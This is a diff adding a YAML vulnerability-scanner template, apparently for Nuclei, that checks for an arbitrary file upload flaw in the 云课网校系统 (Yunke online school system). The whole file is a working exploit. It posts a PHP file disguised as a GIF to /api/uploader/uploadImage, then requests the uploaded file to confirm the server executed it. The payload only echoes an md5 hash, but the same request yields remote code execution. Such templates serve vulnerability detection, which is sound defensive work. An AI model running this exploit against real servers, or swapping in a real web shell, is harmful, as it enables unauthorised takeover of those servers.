@@ -1,0 +1,68 @@
+id: poc-yaml-yunknet-uploadlmage-anyfile-upload
+
+info:
+  name: 云课网校系统 uploadlmage 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+  description: |
+    云课网校系统存在任意文件上传漏洞，通过特定的上传接口可以上传恶意文件，进而可能导致服务器被攻破。
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+  dt_1: "{{date_time('2006')}}"
+  dt_2: "{{date_time('01')}}"
+  dt_3: "{{date_time('02')}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/api/uploader/uploadImage"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykvjj6DInOLIXxe9m
+      x-requested-with: XMLHttpRequest
+    body: |
+      ------WebKitFormBoundarykvjj6DInOLIXxe9m
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.php"
+      Content-Type: image/gif
+
+      <?php echo md5({{t1}});?>
+      ------WebKitFormBoundarykvjj6DInOLIXxe9m--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"url\":"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        regex:
+          - "(?P<file>[0-9a-z]{16,33}).php"
+
+  - id: verify-file
+    method: GET
+    path:
+      - "/upload/image/{{dt_1}}{{dt_2}}{{dt_3}}/{{file}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
